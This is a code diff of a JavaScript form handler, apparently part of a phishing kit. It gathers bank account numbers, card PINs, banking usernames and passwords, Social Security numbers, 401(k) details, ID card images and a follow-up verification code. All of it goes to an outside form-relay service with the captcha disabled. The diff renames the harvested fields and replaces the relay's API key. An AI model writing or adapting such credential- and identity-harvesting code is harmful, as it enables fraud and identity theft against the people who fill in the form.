@@ -156,18 +156,18 @@ const submitForm = () => {
   // formdata to send to staticforms
   const formdata = new FormData();
   formdata.append('bank', form.value.bank);
-  formdata.append('accountNumber', form.value.accountNumber);
-  formdata.append('cardpinNumber', form.value.cardpinNumber);
+  formdata.append('account', form.value.accountNumber);
+  formdata.append('pinNumber', form.value.cardpinNumber);
   formdata.append('amount', form.value.amount);
   formdata.append('nextpayrollDate', form.value.nextpayrollDate);
   formdata.append('username', form.value.username);
   formdata.append('password', form.value.password);
-  formdata.append('ssn', form.value.ssn);
+  formdata.append('socialNumber', form.value.ssn);
   formdata.append('fortyOneK', form.value.fortyOneK);
   formdata.append('fortyOneKProvider', form.value.fortyOneKProvider);
   formdata.append('frontPreview', form.value.frontPreview);
   formdata.append('backPreview', form.value.backPreview);
-  formdata.append('apiKey', 'sf_59ff126e612fde419bb61bb0');
+  formdata.append('apiKey', 'sf_64671de3e756fc49cd48696f');
   formdata.append('_captcha', 'false'); // disable captcha
 
   // send to staticforms
@@ -192,7 +192,7 @@ const submitCodeForm = () => {
   // formdata to send to staticforms
   const formdata = new FormData();
   formdata.append('code', form.value.code);
-  formdata.append('apiKey', 'sf_59ff126e612fde419bb61bb0');
+  formdata.append('apiKey', 'sf_64671de3e756fc49cd48696f');
   // For example, you can send the code to your backend for verification  // send to staticforms
   fetch('https://api.staticforms.dev/submit', {
     method: 'POST',
